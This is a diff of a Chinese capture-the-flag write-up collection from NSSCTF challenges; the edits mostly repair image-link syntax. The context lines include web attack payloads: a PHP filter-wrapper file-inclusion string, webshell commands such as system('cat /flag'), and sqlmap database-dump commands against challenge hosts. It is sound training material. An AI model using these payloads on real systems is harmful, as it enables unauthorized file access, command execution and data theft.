@@ -11,7 +11,7 @@ tags:
   - WriteUp
   - NSSCTF
 created: 2026-03-15T16:49
-updated: 2026-04-17T06:58
+updated: 2026-04-17T06:59
 ---
 
 # 2025 NSSCTF 积累之（一）
@@ -40,7 +40,7 @@ enc文件：14608474132952352328897080717325464308438322623319847428447933943202
 
 社会主义核心价值观解密：
 
-![](<2025 NSSCTF/file-20260331130228808.png)
+![](<2025 NSSCTF/file-20260331130228808.png>)
 
 flag{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}
 
@@ -144,15 +144,15 @@ BJD{D0_Y0u_kNoW_Th1s_b4se_map}
 
 先盲文解密看看
 
-![](<2025 NSSCTF/file-20260331130228090.png)
+![](<2025 NSSCTF/file-20260331130228090.png>)
 
 发现解密后开头不太对：
 
-![](<2025 NSSCTF/file-20260331130228015.png)
+![](<2025 NSSCTF/file-20260331130228015.png>)
 
 试着反转一下再解密
 
-![](<2025 NSSCTF/file-20260331130228099.png)
+![](<2025 NSSCTF/file-20260331130228099.png>)
 
 > 46,66,42,75,66,45,46,6E,6D,4C,73,36,44,33,73,69,59,74,4C,36,58,32,70,34,69,4E,30,63,64,53,6C,79,6B,6D,39,72,51,4E,39,6F,4D,53,31,6A,6B,73,39,72,4B,32,52,36,6B,4C,38,68,6F,72,30,3D
 >
@@ -169,7 +169,7 @@ print(str)
 > 466642756645466E6D4C73364433736959744C3658327034694E306364536C796B6D3972514E396F4D53316A6B7339724B3252366B4C38686F72303D
 >
 
-![](<2025 NSSCTF/file-20260331130228081.png)
+![](<2025 NSSCTF/file-20260331130228081.png>)
 
 FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0=
 
@@ -177,23 +177,23 @@ FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0=
 
 根据题目提示：维吉尼亚密码的key是hgame。不妨先试一下，因为解完末端依旧是=号，然后再base64可能性大一点。
 
-![](<2025 NSSCTF/file-20260331130228063.png)
+![](<2025 NSSCTF/file-20260331130228063.png>)
 
 YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=
 
-![](<2025 NSSCTF/file-20260331130228072.png)
+![](<2025 NSSCTF/file-20260331130228072.png>)
 
 c0bmvghyz_{0Raz_gxxm0thkzo_0ob0m_vokcczt_!r}
 
 根据题目：凯撒21位
 
-![](<2025 NSSCTF/file-20260331130228054.png)
+![](<2025 NSSCTF/file-20260331130228054.png>)
 
 h0gralmde_{0Wfe_lccr0ympet_0tg0r_atphhey_!w}
 
 最后栅栏密码解密：
 
-![](<2025 NSSCTF/file-20260331130228036.png)
+![](<2025 NSSCTF/file-20260331130228036.png>)
 
 hgame{Welc0me_t0_the_w0rld_0f_crypt0graphy!}
 
@@ -220,7 +220,7 @@ hgame{Welc0me_t0_the_w0rld_0f_crypt0graphy!}
 单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：  
 黑客登录系统使用的密码是_____________。
 
-![](<2025 NSSCTF/file-20260331130228438.png)
+![](<2025 NSSCTF/file-20260331130228438.png>)
 
 NSSCTF{Admin123!@#}
 
@@ -250,8 +250,8 @@ NSSCTF{http}
 #### #宽高修改 #图片隐写 #图片修复
 题目：所以下半身是什么呢（ww
 
-+ 解压出一个可爱的小草神.png![](<2025 NSSCTF/file-20260331130228827.png)
-+ 题目提示图片缺少下半部分，故使用[随波逐流]CTF编码工具修复高宽![](<2025 NSSCTF/file-20260331130228817.png)
++ 解压出一个可爱的小草神.png![](<2025 NSSCTF/file-20260331130228827.png>)
++ 题目提示图片缺少下半部分，故使用[随波逐流]CTF编码工具修复高宽![](<2025 NSSCTF/file-20260331130228817.png>)
 
 LitCTF{Fl4g_0fcourse!}
 
@@ -261,11 +261,11 @@ LitCTF{Fl4g_0fcourse!}
 
 附件：stub
 
-![](<2025 NSSCTF/file-20260331130228545.png)
+![](<2025 NSSCTF/file-20260331130228545.png>)
 
 查看发现是jpeg格式。修改后缀：
 
-![](<2025 NSSCTF/file-20260331130228528.png)
+![](<2025 NSSCTF/file-20260331130228528.png>)
 
 题目photos提示有多个图片。可能是叠在一起了。
 
@@ -273,13 +273,13 @@ LitCTF{Fl4g_0fcourse!}
 
 搜索FF D8 FF EE 出现三个结果。
 
-![](<2025 NSSCTF/file-20260331130228553.png)
+![](<2025 NSSCTF/file-20260331130228553.png>)
 
 把另外两个图片复制出来保存。
 
-![](<2025 NSSCTF/file-20260331130228509.png)
+![](<2025 NSSCTF/file-20260331130228509.png>)
 
-![](<2025 NSSCTF/file-20260331130228491.png) 
+![](<2025 NSSCTF/file-20260331130228491.png>) 
 
 这里很坑，明明写得像SOME结果说是S0ME。看来该leet还得leet。        
 
@@ -287,15 +287,15 @@ sdctf{FFD8_th3n_S0ME_s7uff_FFD9}
 
 ### [NSSRound#V Team]画出一个flag
 #### #LSB #MISC #图片隐写
-![](<2025 NSSCTF/file-20260331130228213.png)
+![](<2025 NSSCTF/file-20260331130228213.png>)
 
-![](<2025 NSSCTF/file-20260331130228195.png)
+![](<2025 NSSCTF/file-20260331130228195.png>)
 
 翻了一下，无特别的信息。
 
 使用Stegsolve查看LSB
 
-![](<2025 NSSCTF/file-20260331130228163.png)
+![](<2025 NSSCTF/file-20260331130228163.png>)
 
 保存为zip，解压出一个flag.dat
 
@@ -313,11 +313,11 @@ with open('flag.txt', 'w', encoding='utf-8') as f:
 
 缩小看的确暗藏玄机。
 
-![](<2025 NSSCTF/file-20260331130228204.png)
+![](<2025 NSSCTF/file-20260331130228204.png>)
 
 需要不断调整窗口比例和缩放比例，直至能辨认无误。看得那叫一个老眼昏花。
 
-![](<2025 NSSCTF/file-20260331130228154.png)
+![](<2025 NSSCTF/file-20260331130228154.png>)
 
 这样不错，最清楚了
 
@@ -333,19 +333,19 @@ NSSCTF{!!Draw_draw_A_flag!!}
 
 直接file+checksec
 
-![](<2025 NSSCTF/file-20260331130228790.png)
+![](<2025 NSSCTF/file-20260331130228790.png>)
 
 只开启了栈不可执行，应该是栈溢出题目。
 
 使用ROPgadget
 
-![](<2025 NSSCTF/file-20260331130228771.png)
+![](<2025 NSSCTF/file-20260331130228771.png>)
 
 找到了sh地址：0x08048670 
 
 直接写死：sh_addr = 0x08048670
 
-![](<2025 NSSCTF/file-20260331130228763.png)
+![](<2025 NSSCTF/file-20260331130228763.png>)
 
 
 
@@ -356,7 +356,7 @@ NSSCTF{!!Draw_draw_A_flag!!}
 + 程序执行完一个函数后，会跳回它被调用的地方，即返回地址（存于栈上）
 + 当攻击者输入超长数据后,会覆盖返回地址（Return Address）
 
-![](<2025 NSSCTF/file-20260331130228754.png)
+![](<2025 NSSCTF/file-20260331130228754.png>)
 
 + `gets()`、`strcpy()` 等属于没有边界检查的函数。
 
@@ -458,22 +458,22 @@ NSSCTF{youhaveknowcaesar}
 #### #跳舞的小人 #编码分析 #编码转换
  附件压缩包里一个txt文本，一个加密文件夹
 
-![](<2025 NSSCTF/file-20260331130228701.png)
+![](<2025 NSSCTF/file-20260331130228701.png>)
 
 将密码.txt放入010 editor
 
-![](<2025 NSSCTF/file-20260331130228665.png)
+![](<2025 NSSCTF/file-20260331130228665.png>)
 
-![](<2025 NSSCTF/file-20260331130228632.png)
+![](<2025 NSSCTF/file-20260331130228632.png>)
 
 > wllm_is_the_best_team!
 >
 
-解压得到：![](<2025 NSSCTF/file-20260331130228648.png)
+解压得到：![](<2025 NSSCTF/file-20260331130228648.png>)
 
 网上搜索跳舞的小人解码图：
 
-![](<2025 NSSCTF/file-20260331130228656.jpeg)
+![](<2025 NSSCTF/file-20260331130228656.jpeg>)
 
 flag{iloveholmesandwllm}
 
@@ -488,7 +488,7 @@ flag{iloveholmesandwllm}
 
 十六进制转字符即可
 
-![](<2025 NSSCTF/file-20260331130228343.png)
+![](<2025 NSSCTF/file-20260331130228343.png>)
 
 LitCTF{tai111coollaaa!}
 
@@ -498,13 +498,13 @@ LitCTF{tai111coollaaa!}
 #### #Base64 #RC4 #XOR
 **附件：**
 
-![](<2025 NSSCTF/file-20260331130227858.png)
+![](<2025 NSSCTF/file-20260331130227858.png>)
 
-![](<2025 NSSCTF/file-20260331130227868.png)拿到题目首先upx脱壳。再ida32分析：
+![](<2025 NSSCTF/file-20260331130227868.png>)拿到题目首先upx脱壳。再ida32分析：
 
-![](<2025 NSSCTF/file-20260331130227877.png)
+![](<2025 NSSCTF/file-20260331130227877.png>)
 
-![](<2025 NSSCTF/file-20260331130227886.png)
+![](<2025 NSSCTF/file-20260331130227886.png>)
 
 ```python
 int sub_804887C()
@@ -778,17 +778,17 @@ NSSCTF{0bbd067c-24bd-454c-9111-6cd1b67b6da4}
 #### #数组绕过 #正则绕过 #弱比较 #PHP的类型转换 #伪协议 #extract函数的使用 #sha1碰撞
 环境：http://node4.anna.nssctf.cn:28905/
 
-![](<2025 NSSCTF/file-20260331130228589.png)
+![](<2025 NSSCTF/file-20260331130228589.png>)
 
 Ctrl+U查看源代码
 
-![](<2025 NSSCTF/file-20260331130228562.png)
+![](<2025 NSSCTF/file-20260331130228562.png>)
 
 **GFXEIM3YFZYGQ4A=**显然是线索。
 
 全大写+等号，推测是base32编码。放入CyberChef解码。
 
-![](<2025 NSSCTF/file-20260331130228536.png)
+![](<2025 NSSCTF/file-20260331130228536.png>)
 
 ```php
 <?php
@@ -975,15 +975,15 @@ debu_debu_aqua
 
 ### [SWPUCTF 2021 新生赛]include
 #### #PHP伪协议 #PHP #文件包含
-![](<2025 NSSCTF/file-20260331130228287.png)![](<2025 NSSCTF/file-20260331130228280.png)
+![](<2025 NSSCTF/file-20260331130228287.png>)![](<2025 NSSCTF/file-20260331130228280.png>)
 
 构造：?file=php://filter/read=convert.base64-encode/resource=flag.php
 
-![](<2025 NSSCTF/file-20260331130228251.png)
+![](<2025 NSSCTF/file-20260331130228251.png>)
 
 PD9waHANCiRmbGFnPSdOU1NDVEZ7OTdiYWY3MmUtMDg0ZS00MGIwLWFmYzEtMWE2NzAxOWFkODA2fSc7
 
-![](<2025 NSSCTF/file-20260331130228271.png)
+![](<2025 NSSCTF/file-20260331130228271.png>)
 
 NSSCTF{97baf72e-084e-40b0-afc1-1a67019ad806}
 
@@ -1007,7 +1007,7 @@ NSSCTF{97baf72e-084e-40b0-afc1-1a67019ad806}
 #### #PDF隐写#压缩包分析
 先尝试用文件名解压，发现确实是解压密码。
 
-![](<2025 NSSCTF/file-20260331130228745.png)
+![](<2025 NSSCTF/file-20260331130228745.png>)
 
 显然多层嵌套无底洞。
 
@@ -1024,15 +1024,15 @@ while True:
 
 解压后得到破损PDF
 
-![](<2025 NSSCTF/file-20260331130228718.png)
+![](<2025 NSSCTF/file-20260331130228718.png>)
 
 放入010editor查看
 
-![](<2025 NSSCTF/file-20260331130228727.png)
+![](<2025 NSSCTF/file-20260331130228727.png>)
 
 很规律的一大块。发现其中Filter前面暗藏玄机。故Ctrl+F搜索Filter，在**Variables**变量表中获取flag
 
-![](<2025 NSSCTF/file-20260331130228737.png)
+![](<2025 NSSCTF/file-20260331130228737.png>)
 
 NSSCTF{25da50b7993c0db55867a5a51f32f35c}
 
@@ -1040,11 +1040,11 @@ NSSCTF{25da50b7993c0db55867a5a51f32f35c}
 #### #Misc文件 #隐写音频 #隐写
 1. 把需要分析的mp3文件拖到MP3stego所在目录
 
-![](<2025 NSSCTF/file-20260331130228481.png)
+![](<2025 NSSCTF/file-20260331130228481.png>)
 
 2. Decode.exe -X cipher.mp3
 
-![](<2025 NSSCTF/file-20260331130228472.png)
+![](<2025 NSSCTF/file-20260331130228472.png>)
 
 ## 4.Pwn
 
@@ -1054,11 +1054,11 @@ NSSCTF{25da50b7993c0db55867a5a51f32f35c}
 #### #反调试 #REVERSE
 题目描述：There might be a hidden gate to the magical land of flags...
 
-![](<2025 NSSCTF/file-20260331130228709.png)
+![](<2025 NSSCTF/file-20260331130228709.png>)
 
 默认值：
 
-![](<2025 NSSCTF/file-20260331130228691.png)
+![](<2025 NSSCTF/file-20260331130228691.png>)
 
 ```plain
 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
@@ -1079,7 +1079,7 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
   ((void (__thiscall __noreturn *)(_OWORD *))sub_401290)(v3);
 ```
 
-重新用ida32打开magic.exe，进入`内核选项 kernel options`，**取消勾选** `进行"无返回"分析 perform no-return analysis`，这样分析`main` 函数内容会更完整。  ![](<2025 NSSCTF/file-20260331130228673.png)
+重新用ida32打开magic.exe，进入`内核选项 kernel options`，**取消勾选** `进行"无返回"分析 perform no-return analysis`，这样分析`main` 函数内容会更完整。  ![](<2025 NSSCTF/file-20260331130228673.png>)
 
 操作后：
 
@@ -1209,7 +1209,7 @@ flag{GaqY7KtEtrVIX1Q5oP5iEBRCYXEAy8rT}
 
 这题只有一种方法：ciphey一把梭，否则是无法按常理做出来的。
 
-![](<2025 NSSCTF/file-20260331130228464.png)flag{W0w_y0u_c4n_rea11y_enc0d1ng!}
+![](<2025 NSSCTF/file-20260331130228464.png>)flag{W0w_y0u_c4n_rea11y_enc0d1ng!}
 
 ### [SWPUCTF 2021 新生赛]traditional
 #### #古典密码 #其他
@@ -1234,7 +1234,7 @@ flag{GaqY7KtEtrVIX1Q5oP5iEBRCYXEAy8rT}
 >  格式：NSSCTF{}
 >
 
-![](<2025 NSSCTF/file-20260331130228334.jpeg)![](<2025 NSSCTF/file-20260331130228324.jpeg)
+![](<2025 NSSCTF/file-20260331130228334.jpeg>)![](<2025 NSSCTF/file-20260331130228324.jpeg>)
 
 ```python
 #!/usr/bin/env python3
@@ -1475,7 +1475,7 @@ NSSCTF{5e3b5793-b1f6-488a-bac4-53e9c4889ed7}
 
 ### [SWPUCTF 2021 新生赛]easy_md5
 #### #弱比较 #PHP #数组绕过
-![](<2025 NSSCTF/file-20260331130228456.png)
+![](<2025 NSSCTF/file-20260331130228456.png>)
 
 ```php
 <?php #PHP代码的起始标记，表示后续是PHP代码。
@@ -1509,11 +1509,11 @@ else {
 ?>
 ```
 
-![](<2025 NSSCTF/file-20260331130228500.png)
+![](<2025 NSSCTF/file-20260331130228500.png>)
 
 EXECUTE
 
-![](<2025 NSSCTF/file-20260331130228518.png)
+![](<2025 NSSCTF/file-20260331130228518.png>)
 
 ### 漏洞原理
 + 当PHP的 md5() 函数接收 数组 时，会返回 NULL
@@ -1540,17 +1540,17 @@ EXECUTE
 
 ### [SWPUCTF 2021 新生赛]caidao
 #### #RCEPHP #信息收集
-![](<2025 NSSCTF/file-20260331130228263.png)
+![](<2025 NSSCTF/file-20260331130228263.png>)
 
 法一：打开网页看到一句话木马命令（想到中国蚁剑）
 
-![](<2025 NSSCTF/file-20260331130228242.png)
+![](<2025 NSSCTF/file-20260331130228242.png>)
 
-![](<2025 NSSCTF/file-20260331130228233.png)
+![](<2025 NSSCTF/file-20260331130228233.png>)
 
 退到最外层，直接找到flag
 
-![](<2025 NSSCTF/file-20260331130228224.png)
+![](<2025 NSSCTF/file-20260331130228224.png>)
 
 NSSCTF{62487fd7-b969-4456-a318-f777ccbb1cc1}
 
@@ -1559,11 +1559,11 @@ NSSCTF{62487fd7-b969-4456-a318-f777ccbb1cc1}
 
 `**wllm=system("ls /");**`
 
-![](<2025 NSSCTF/file-20260331130228135.png)
+![](<2025 NSSCTF/file-20260331130228135.png>)
 
 `wllm=system('cat /flag');`
 
-![](<2025 NSSCTF/file-20260331130228145.png)
+![](<2025 NSSCTF/file-20260331130228145.png>)
 
 NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}
 
@@ -1571,13 +1571,13 @@ NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}
 
 Repeater把GET改为POST，右侧Inspector添加请求主体参数。
 
-![](<2025 NSSCTF/file-20260331130228125.png)
+![](<2025 NSSCTF/file-20260331130228125.png>)
 
 发送查看响应：
 
-![](<2025 NSSCTF/file-20260331130228116.png)
+![](<2025 NSSCTF/file-20260331130228116.png>)
 
-![](<2025 NSSCTF/file-20260331130228108.png)
+![](<2025 NSSCTF/file-20260331130228108.png>)
 
 NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}
 
@@ -1590,11 +1590,11 @@ NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}
 
 ### [BJDCTF 2020]鸡你太美  
 #### #编码分析 #脚本编写 #GIF提取
-![](<2025 NSSCTF/file-20260331130228606.png)
+![](<2025 NSSCTF/file-20260331130228606.png>)
 
 这个gif文件没有正确显示。文件头修复：
 
-![](<2025 NSSCTF/file-20260331130228580.png)
+![](<2025 NSSCTF/file-20260331130228580.png>)
 
 NSSCTF{zhi-yin-you-are-beautiful}
 
@@ -1612,7 +1612,7 @@ flag{Welcome_to_changchengbe1}
 
 ### [MoeCTF 2021]midpython
 #### #Python #自定义逻辑 #REVERSE
-![](<2025 NSSCTF/file-20260331130228640.png)
+![](<2025 NSSCTF/file-20260331130228640.png>)
 
 [https://cn.bing.com/search?q=pyinstxtractor](https://cn.bing.com/search?q=pyinstxtractor)
 
@@ -1622,13 +1622,13 @@ flag{Welcome_to_changchengbe1}
 python pyinstxtractor.py 文件名
 ```
 
-![](<2025 NSSCTF/file-20260331130228597.png)
+![](<2025 NSSCTF/file-20260331130228597.png>)
 
 获得大量文件。寻找核心的Midpython.pyc，使用**pycdc**
 
-![](<2025 NSSCTF/file-20260331130228623.png)
+![](<2025 NSSCTF/file-20260331130228623.png>)
 
-![](<2025 NSSCTF/file-20260331130228615.png)
+![](<2025 NSSCTF/file-20260331130228615.png>)
 
 ```python
 key = [
@@ -1854,11 +1854,11 @@ NSSCTF{jwt}
 #### #流量分析 #日志审计 #脚本编写
 抢分做法：一把梭
 
-![](<2025 NSSCTF/file-20260331130228782.png)
+![](<2025 NSSCTF/file-20260331130228782.png>)
 
 回顾：
 
-![](<2025 NSSCTF/file-20260331130228799.png)
+![](<2025 NSSCTF/file-20260331130228799.png>)
 
 1. 发现大量HTTP请求包含SQL盲注特征
 
@@ -1872,17 +1872,17 @@ flag{w1reshARK_ez_1sntit}
 
 ### [ByteCTF 2019]BabyBlog
 #### #二次注入 #正则RCE #diable_function绕过
-### ![](<2025 NSSCTF/file-20260331130228447.png)
+### ![](<2025 NSSCTF/file-20260331130228447.png>)
 
 ### [第五空间 2021]WebFTP
 #### #目录扫描 #信息收集 #.git泄露
-![](<2025 NSSCTF/file-20260331130228045.png)
+![](<2025 NSSCTF/file-20260331130228045.png>)
 
 使用御剑工具扫描，发现大量域名
 
-![](<2025 NSSCTF/file-20260331130227997.png)
+![](<2025 NSSCTF/file-20260331130227997.png>)
 
-![](<2025 NSSCTF/file-20260331130228026.png)![](<2025 NSSCTF/file-20260331130228006.png)
+![](<2025 NSSCTF/file-20260331130228026.png>)![](<2025 NSSCTF/file-20260331130228006.png>)
 
 NSSCTF{f632d0a0-0321-4df6-b3b7-fae9e4c0b269}
 
@@ -1892,9 +1892,9 @@ NSSCTF{f632d0a0-0321-4df6-b3b7-fae9e4c0b269}
 
 昨天十三年社团讲课，讲了Robots.txt的作用，小刚上课没有认真听课正在着急，你能不能帮帮忙
 
-![](<2025 NSSCTF/file-20260331130227988.png)
+![](<2025 NSSCTF/file-20260331130227988.png>)
 
-![](<2025 NSSCTF/file-20260331130227970.png)
+![](<2025 NSSCTF/file-20260331130227970.png>)
 
 flag{29d2b23a9f2145888d1f8c76e2b4a8b4}
 
@@ -1910,7 +1910,7 @@ SQL注入报错注入布尔盲注
 
 `curl -I "http://node4.anna.nssctf.cn:24443/"`
 
-![](<2025 NSSCTF/file-20260331130227979.png)
+![](<2025 NSSCTF/file-20260331130227979.png>)
 
 看什么：
 
@@ -1926,11 +1926,11 @@ SQL注入报错注入布尔盲注
 
 `curl -s "http://node4.anna.nssctf.cn:24443/"`
 
-![](<2025 NSSCTF/file-20260331130227960.png)
+![](<2025 NSSCTF/file-20260331130227960.png>)
 
 Ctrl+U查看源代码也可
 
-![](<2025 NSSCTF/file-20260331130227941.png)
+![](<2025 NSSCTF/file-20260331130227941.png>)
 
 观察结果：
 
@@ -1943,7 +1943,7 @@ Ctrl+U查看源代码也可
 
 `curl -s "http://node4.anna.nssctf.cn:24443/?wllm=test"`
 
-![](<2025 NSSCTF/file-20260331130227951.png)
+![](<2025 NSSCTF/file-20260331130227951.png>)
 
 先用普通值测试参数是否被处理，页面变化=参数有效
 
@@ -1982,7 +1982,7 @@ Ctrl+U查看源代码也可
 + 注入类型（Boolean、Time、Error等）
 + 注入技术（UNION、Boolean等）
 
-![](<2025 NSSCTF/file-20260331130227933.png)
+![](<2025 NSSCTF/file-20260331130227933.png>)
 
 数据库信息：back-end DBMS: MySQL >= 5.0 (MariaDB fork)  
   web application technology: Nginx 1.14.2, PHP 5.6.40
@@ -2030,7 +2030,7 @@ Ctrl+U查看源代码也可
 
 + --dbs：列出所有数据库
 
-![](<2025 NSSCTF/file-20260331130227915.png)
+![](<2025 NSSCTF/file-20260331130227915.png>)
 
  test_db    ← 这个看起来可疑！
 
@@ -2044,7 +2044,7 @@ Ctrl+U查看源代码也可
 + -D test_db：指定数据库
 + --tables：列出该数据库的所有表
 
-![](<2025 NSSCTF/file-20260331130227924.png)
+![](<2025 NSSCTF/file-20260331130227924.png>)
 
   4.4 查看表结构
 
@@ -2055,7 +2055,7 @@ Ctrl+U查看源代码也可
 + -T test_tb：指定表
 + --columns：查看表结构
 
-![](<2025 NSSCTF/file-20260331130227905.png)
+![](<2025 NSSCTF/file-20260331130227905.png>)
 
   4.5 获取FLAG！
 
@@ -2066,7 +2066,7 @@ sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch -D test_db -T test
 
 + --dump：导出表中的所有数据
 
-![](<2025 NSSCTF/file-20260331130227896.png)
+![](<2025 NSSCTF/file-20260331130227896.png>)
 
 NSSCTF{ecd98b8f-2324-48e6-9785-0b5ec164a0ee}
 
@@ -2158,31 +2158,31 @@ sqlmap -u "URL?param=1" --batch -D dbname -T tablename --dump
 #### #GIF #提取二维码 #图片隐写
 纯找。
 
-![](<2025 NSSCTF/file-20260331130228571.png)
+![](<2025 NSSCTF/file-20260331130228571.png>)
 
 
 
 ### [NISACTF 2022]huaji？
 #### #图片隐写 #压缩包分析 #图片分离
-![](<2025 NSSCTF/file-20260331130228421.png)
+![](<2025 NSSCTF/file-20260331130228421.png>)
 
 binwalk提取文件：
 
 一个加密zip内含flag
 
-![](<2025 NSSCTF/file-20260331130228396.png)
+![](<2025 NSSCTF/file-20260331130228396.png>)
 
 接下来找解压密码。原图片应该还有未发掘信息。
 
-![](<2025 NSSCTF/file-20260331130228412.png)
+![](<2025 NSSCTF/file-20260331130228412.png>)
 
 6374665f4e4953415f32303232
 
-![](<2025 NSSCTF/file-20260331130228387.png)
+![](<2025 NSSCTF/file-20260331130228387.png>)
 
 ctf_NISA_2022。解压
 
-![](<2025 NSSCTF/file-20260331130228404.png)
+![](<2025 NSSCTF/file-20260331130228404.png>)
 
 flag{Nls@_FumYEnnOjy}
 
